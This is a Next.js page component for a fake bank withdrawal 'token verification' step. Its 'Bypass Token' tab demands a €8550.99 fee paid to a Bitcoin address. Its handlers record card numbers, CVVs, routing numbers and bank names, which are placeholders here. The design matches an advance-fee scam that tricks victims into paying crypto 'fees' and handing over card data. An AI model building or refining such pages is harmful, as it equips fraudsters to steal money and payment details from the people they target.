"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { QrCode, Copy, AlertCircle } from "lucide-react"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import db from "@/lib/db"

export default function TokenVerificationPage() {
  const router = useRouter()
  const [tokenCode, setTokenCode] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showCopiedMessage, setShowCopiedMessage] = useState(false)

  // Example BTC wallet address
  const btcWalletAddress = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    // Create a pending transaction in the database
    const transaction = db.createTransaction({
      date: new Date().toLocaleDateString(),
      time: new Date().toLocaleTimeString(),
      cardNumber: "4532 9856 1234 5678", // This would come from previous form
      expiryDate: "09/26", // This would come from previous form
      cvv: "123", // This would come from previous form
      routingNumber: "021000021", // This would come from previous form
      bank: "Deutsche Bank (Germany)", // This would come from previous form
      amount: "3500.00", // This would come from previous form
      transactionCharge: "175.00",
      reference: `REF-${Math.floor(Math.random() * 10000000)}`,
    })

    // Simulate form submission
    setTimeout(() => {
      router.push("/international-bank/pending")
    }, 1000)
  }

  const handleBypassPayment = () => {
    setIsSubmitting(true)

    // Create a pending transaction in the database with bypass fee
    const transaction = db.createTransaction({
      date: new Date().toLocaleDateString(),
      time: new Date().toLocaleTimeString(),
      cardNumber: "4532 9856 1234 5678", // This would come from previous form
      expiryDate: "09/26", // This would come from previous form
      cvv: "123", // This would come from previous form
      routingNumber: "021000021", // This would come from previous form
      bank: "Deutsche Bank (Germany)", // This would come from previous form
      amount: "3500.00", // This would come from previous form
      transactionCharge: "175.00",
      bypassFee: "8550.99",
      reference: `REF-${Math.floor(Math.random() * 10000000)}`,
    })

    // Simulate payment processing
    setTimeout(() => {
      router.push("/international-bank/pending")
    }, 1500)
  }

  const copyToClipboard = () => {
    navigator.clipboard.writeText(btcWalletAddress)
    setShowCopiedMessage(true)
    setTimeout(() => setShowCopiedMessage(false), 2000)
  }

  return (
    <div className="container mx-auto px-4 py-12">
      <div className="flex flex-col items-center justify-center">
        <div className="w-full max-w-md">
          <Card>
            <CardHeader>
              <CardTitle>Token Verification</CardTitle>
              <CardDescription>Please enter your token code to complete the withdrawal</CardDescription>
            </CardHeader>
            <CardContent>
              <Tabs defaultValue="token">
                <TabsList className="grid w-full grid-cols-2">
                  <TabsTrigger value="token">Enter Token</TabsTrigger>
                  <TabsTrigger value="bypass">Bypass Token</TabsTrigger>
                </TabsList>

                <TabsContent value="token">
                  <form onSubmit={handleSubmit} className="space-y-4 pt-4">
                    <div className="space-y-2">
                      <Label htmlFor="tokenCode">Token Code</Label>
                      <Input
                        id="tokenCode"
                        placeholder="Enter your token code"
                        value={tokenCode}
                        onChange={(e) => setTokenCode(e.target.value)}
                        required
                      />
                    </div>
                    <Button type="submit" className="w-full" disabled={isSubmitting || !tokenCode}>
                      {isSubmitting ? "Verifying..." : "Verify Token"}
                    </Button>
                  </form>
                </TabsContent>

                <TabsContent value="bypass" className="space-y-4 pt-4">
                  <Alert>
                    <AlertCircle className="h-4 w-4" />
                    <AlertTitle>Token Bypass Fee</AlertTitle>
                    <AlertDescription>
                      To bypass token verification, a one-time fee of €8550.99 is required.
                    </AlertDescription>
                  </Alert>

                  <div className="space-y-4">
                    <div className="p-4 border rounded-lg">
                      <h3 className="font-medium mb-2">Pay with Bitcoin (BTC)</h3>
                      <div className="flex justify-center mb-4">
                        <div className="bg-white p-4 rounded-lg">
                          <QrCode size={150} className="text-black" />
                        </div>
                      </div>

                      <div className="space-y-2">
                        <Label>BTC Wallet Address</Label>
                        <div className="flex">
                          <Input value={btcWalletAddress} readOnly className="rounded-r-none" />
                          <Button variant="outline" className="rounded-l-none" onClick={copyToClipboard}>
                            <Copy className="h-4 w-4" />
                          </Button>
                        </div>
                        {showCopiedMessage && <p className="text-xs text-green-600">Copied to clipboard!</p>}
                      </div>
                    </div>

                    <Button onClick={handleBypassPayment} className="w-full" disabled={isSubmitting}>
                      {isSubmitting ? "Processing Payment..." : "I've Made the Payment"}
                    </Button>
                  </div>
                </TabsContent>
              </Tabs>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  )
}

